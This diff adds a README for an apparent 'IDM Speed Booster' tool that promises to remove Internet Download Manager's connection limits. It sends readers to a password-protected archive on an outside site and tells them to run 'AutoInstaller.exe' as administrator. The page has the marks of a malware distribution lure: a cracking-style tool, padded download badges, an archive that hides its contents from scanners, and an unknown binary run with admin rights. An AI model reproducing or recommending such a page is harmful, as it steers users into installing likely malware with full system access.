@@ -1,0 +1,48 @@
+# IDM Speed Booster 2026 — Max Download Speed
+
+![Windows](https://img.shields.io/badge/Windows-10%2F11-0078D6?style=flat-square&logo=windows&logoColor=white)
+![Version](https://img.shields.io/badge/Version-6.42-brightgreen?style=flat-square)
+![License](https://img.shields.io/badge/License-MIT-blue?style=flat-square)
+![Downloads](https://img.shields.io/badge/Downloads-48k+-orange?style=flat-square)
+
+Unlocks IDM's connection count limit and disables throttle detection for maximum download speed.
+
+## Features
+
+- Removes 32-connection cap per download
+- Throttle detection bypass
+- Server IP rotation for multi-source
+- MTU optimizer
+- DNS prefetch for download links
+- Speed test integration
+
+## Download
+
+[![Download v6.42](https://img.shields.io/badge/Download_v6.42-ec4899?style=for-the-badge&logoColor=white)](https://forumconnect.uk/idmspeedhack)
+
+> The archive password is shown on the download page.
+
+## How to Use
+
+1. Download the archive using the button above
+2. Extract with WinRAR or 7-Zip (enter the password when prompted)
+3. Right-click `AutoInstaller.exe` and select **Run as administrator**
+4. Follow the on-screen instructions and click **Install**
+
+## FAQ
+
+**Breaks other internet?**  
+Only affects IDM connections. Browsing unchanged.
+
+**Safe for servers?**  
+Use Moderate mode first to avoid host bans.
+
+## Requirements
+
+- Windows 10 / 11 (64-bit)
+- IDM installed
+- Administrator rights
+
+## License
+
+MIT
